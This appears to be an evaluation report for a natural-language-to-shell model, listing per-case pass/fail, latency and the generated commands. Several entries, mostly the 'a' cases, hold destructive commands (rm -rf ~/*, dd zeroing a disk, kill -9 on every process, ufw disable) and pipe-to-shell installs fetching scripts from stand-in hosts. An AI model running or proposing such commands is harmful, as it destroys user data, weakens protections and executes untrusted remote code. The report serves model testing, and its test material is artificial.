# eval: llama-server / /Users/hridyaagrawal/.local/share/lexis/models/nl2sh-coder-15b.gguf (nl2sh-coder-15b)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 42/72 (58%)
- cold p50 341ms p95 1548ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✗ | 151 | - | echo $(node -v) $(npm -v) |
| u02 | ✓ | 1548 | - | ls -lR | grep -v /$ | grep -v /$ | grep -v /$ | grep -v /$ | grep -v /$ | grep - |
| u03 | ✓ | 1104 | - | curl ifconfig.me | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n1 | xargs ech |
| u04 | ✓ | 1526 | - | lsof -i:3000 | grep 3000 | grep -v grep | grep -v psmcgis | grep -v zsh | grep - |
| u05 | ✗ | 1493 | - | du -hs * | sort -h | head -n 10; echo "needs manual review" 2>/dev/null | true | |
| u06 | ✗ | 354 | - | find . -mtime 0 -name "*.log" -exec echo {} \; |
| u07 | ✓ | 112 | - | ps aux | grep node |
| u08 | ✓ | 387 | - | git status | grep "\*" | grep branch_name; echo "needs manual review" |
| u09 | ✗ | 268 | - | rgp -h || echo "needs manual review" |
| u10 | ✓ | 141 | - | mkdir projects && cd projects |
| u11 | ✓ | 309 | - | tar -zcvf archive.tar.gz * && echo "archive.tar.gz" |
| u12 | ✓ | 130 | - | env | grep PATH |
| u13 | ✗ | 517 | - | ps -ef | grep 8080 | grep -v grep | awk '{print $2}' | xargs kill -9 |
| u14 | ✓ | 314 | - | tail -n 20 /var/log/syslog.log |
| u15 | ✗ | 566 | - | [[ -n $(command -v python3) ]] && echo "python3 is installed" || echo "needs man |
| u16 | ✓ | 120 | - | brew update && brew outdated |
| u17 | ✗ | 288 | - | echo $(uname -s) $(echo $HOME) |
| u18 | ✓ | 151 | - | git reset HEAD~1 |
| u19 | ✗ | 288 | - | echo $(ls -S ~/ | head -n 5) |
| u20 | ✓ | 1663 | - | free -h | grep "total" | awk '{print $3/$2 * 100 "% used"}' | grep -v "total" |  |
| u21 | ✓ | 664 | - | find . -type f -name "*.js" -exec wc -l {} \; | awk '{total+=$1} END {print tota |
| u22 | ✓ | 188 | - | sudo systemctl restart docker.service |
| u23 | ✓ | 329 | - | source <(echo "chmod +x script.sh && ./script.sh") |
| u24 | ✗ | 916 | - | find . -type f -exec grep -l TODO {} \; | xargs sed -i -e 's/TODO/#done/;'  # ad |
| u25 | ✓ | 300 | - | curl -L https://example.com/file.zip -o ~/Downloads/file.zip |
| u26 | ✗ | 1427 | - | dconf list /system/kernel/ | grep -E 'cpu|core' | xargs -I {} cat {} | grep -E ' |
| u27 | ✓ | 374 | - | echo "export FOO=bar" >> ~/.zshrc; echo "needs manual review" |
| u28 | ✓ | 405 | - | find . -type d -name node_modules -exec rm -rf {} \; |
| u29 | ✗ | 323 | - | echo $(lsof -iTCP -sTCP:LISTEN) |
| u30 | ✓ | 657 | - | source <(curl -s https://raw.githubusercontent.com/dsnetcafe/fav-tools/master/un |
| u31 | ✓ | 307 | - | tail -f log_file.log | grep -E 'ERROR|FATAL' |
| u32 | ✗ | 882 | - | uptime -p | grep -o -E '[0-9]+ hours? [0-9]+ minutes? [0-9]+ seconds?' | tr -d [ |
| u33 | ✗ | 1440 | - | ls -1 ~/.zshrc ~/.zshenv ~/.zprofile ~/.zlogin ~/.zlogout ~/.zdotfiles/ ~/.zprof |
| u34 | ✗ | 326 | - | echo $(cat /etc/resolv.conf | grep nameserver | awk '{print $2}') |
| u35 | ✓ | 109 | - | cp file.txt backup.txt |
| u36 | ✓ | 83 | - | mv old.txt new.txt |
| u37 | ✗ | 531 | - | find ~/Downloads -type f -exec du -h {} \; | awk '{total+=$1} END {print total}' |
| u38 | ✗ | 1311 | - | npm list -g --depth=0 | grep -v 'node_modules' | sed 's/.* \(.*\)/\1/' | nl -n l |
| u39 | ✓ | 111 | - | open -a Finder . |
| u40 | ✓ | 305 | - | sudo systemd-resolve --flush-caches; echo "needs manual review" |
| a01 | ✓ | 135 | - | rm -rf ~/* |
| a02 | ✓ | 1593 | - | sudo dd if=/dev/zero of=/dev/sdX bs=1M && sudo mkfs.ext4 /dev/sdX && sudo mkdir  |
| a03 | ✓ | 134 | - | git push -f origin main |
| a04 | ✗ | 399 | - | curl https://sketchy.example.com/install.sh | zsh -s -- |
| a05 | ✗ | 350 | - | kill -9 $(ps -ef | awk '{print $2}') |
| a06 | ✗ | 141 | - | echo "needs manual review" |
| a07 | ✗ | 154 | - | echo "needs manual review" |
| a08 | ✓ | 357 | - | curl -Ls https://x.io/i | sh -s -- |
| a09 | ✓ | 535 | - | find / -type f -exec chmod 644 {} \; -exec chmod 755 {} \; |
| a10 | ✓ | 229 | - | find /var/log -mtime +30 -exec rm {} \; |
| a11 | ✗ | 609 | - | crontab -l -u $USER | cat - ~/path/to/script.sh | crontab -u $USER -; |
| a12 | ✓ | 341 | - | git reset --hard HEAD~$(git rev-list HEAD | wc -l) |
| a13 | ✓ | 1440 | - | sudo npm uninstall -g node/npm && sudo rm -rf /usr/local/share/man/man1/node.1 / |
| a14 | ✓ | 119 | - | sudo ufw disable |
| a15 | ✓ | 339 | - | find /tmp -type f -mtime +7 -exec rm {} \; |
| a16 | ✓ | 1306 | - | shuf -n 1 <(echo "rm -rf --one-file-system /" | sed 's/ /\n/g' | tr -d '\n' | se |
| a17 | ✓ | 482 | - | rm -rf ~ && echo "needs manual review" |
| a18 | ✗ | 915 | - | echo hunter2 | openssl enc -aes-256-cbc -md sha256 -salt -in path/to/file -out p |
| a19 | ✗ | 285 | - | source <(echo "echo 'needs manual review'") |
| a20 | ✗ | 159 | - | echo "needs manual review" |
| u41 | ✗ | 1203 | - | find ~ -size +100M -print0 | xargs -0 du -h | grep -E '^([0-9]+)[[:space:]]+(100 |
| u42 | ✗ | 193 | - | echo "needs manual review" |
| u43 | ✓ | 501 | - | git log -n 5 | head -n 20 | tail -n 5 |
| u44 | ✓ | 615 | - | curl -sL example.com | cat - # or cat -sL example.com; echo "needs manual review |
| u45 | ✓ | 219 | - | find . -type f | wc -l |
| u46 | ✓ | 1678 | - | ifconfig | grep inet | grep -v 127.0.0.1 | grep -v 169.254 | grep -v link | grep |
| u47 | ✗ | 133 | - | sudo df -h -a |
| u48 | ✗ | 1030 | - | who -s | grep -v root | awk '{print $2}' | tr -d '\n' | sed 's/ /,/g' | sed 's/^ |
| a21 | ✗ | 431 | - | 0 0 * * * echo "rm -rf /tmp/*" | crontab -l -u root; |
| a22 | ✓ | 273 | - | ln -s ~/my/hosts /etc/hosts |
| a23 | ✓ | 209 | - | find . -exec rm {} \; |
| a24 | ✗ | 259 | - | curl https://x.io/i.sh | bash |
